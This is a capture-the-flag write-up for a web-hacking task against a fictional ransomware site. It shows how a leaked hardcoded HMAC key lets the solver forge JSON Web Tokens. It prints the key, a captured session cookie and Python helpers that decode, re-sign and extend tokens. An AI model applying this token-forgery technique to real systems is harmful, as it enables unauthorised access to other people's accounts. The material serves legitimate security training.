# Task 6
## Category: Web Hacking/Redacted
### Prompt:
We've found the login page on the ransomware site, but we don't know anyone's username or password. Luckily, the file you recovered from the attacker's computer looks like it could be helpful.

Generate a new token value which will allow you to access the ransomware site.
### Provided Materials:
- None
### Task Goal:
- User level authentication token
### Steps:
To start, we have to figure out how new users are created. Looking at the source code acquired in task b2, we can see the function for generating a token in util.py:

```python
def generate_token(userName):
	""" Generate a new login token for the given user, good for 30 days"""
	with userdb() as con:
		row = con.execute("SELECT uid, secret from Accounts WHERE userName = ?", (userName,)).fetchone()
		now = datetime.now()
		exp = now + timedelta(days=30)
		claims = {'iat': now,
		          'exp': exp,
				  'uid': row[0],
				  'sec': row[1]}
		return jwt.encode(claims, hmac_key(), algorithm='HS256')
```
The site uses JSON Web Tokens (JWTs) to authenticate it's users. From this function it's clear that there are four required claims:
1. iat (Issued At)
2. exp (Expiration)
3. uid (User ID)
4. sec (Secret)

as well as the HMAC key used in the HS256 encryption:
```python
def hmac_key():
	return "v3e1sgmbRnCfBdSuUBEuXFQgPZgnlwum"
```
The iat and exp claims are generated on token creation, so we only need to find a user's sec value and their UID.

In the previous task we got a netscape cookie that includes a JWT value:
```
# Netscape HTTP Cookie File
wiybrlehcuuflsbz.ransommethis.net    FALSE    /    TRUE    2145916800    tok    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NTI5MzkxMTIsImV4cCI6MTY1NTUzMTExMiwic2VjIjoiS3dvYmV3Y1daSEhocWVCVm9VTGVsMFVHeUh6VGF6YzgiLCJ1aWQiOjMyMzQyfQ.bpKQ81q5f035Huol1WSUAwwXXx_uVEoRGSi0Y-c2l_U
```

I wrote some python functions to help interact with the site:

```python
def get_hmac():
    return "v3e1sgmbRnCfBdSuUBEuXFQgPZgnlwum"
def create_token(iat, exp, uid, secret):
    return jwt.encode({'iat': iat, 'exp': exp, 'sec':secret, 'uid':uid,}, get_hmac(), algorithm='HS256')
def refresh_token(token):
    claims = decode_token(token)
    claims['exp'] = datetime.now()+timedelta(days=30)
    return create_token(claims['iat'], claims['exp'], claims['uid'], claims['sec'])
def decode_token(token):
    return jwt.decode(token, get_hmac(), algorithms=['HS256'], options={'verify_exp': False})
```

Using decode_token() on the token in the netscape cookie gives us the two claims for our compromised user:

![Alt text](../images/task_6_decoded.png "Screenshot of a python terminal showing the decode_token function in use")
Then we can either use the create_token function with the discovered claims, or simply use the refresh_token function to fix the exp and iat claims.

![Alt text](../images/badge6.png "Badge for task 6")
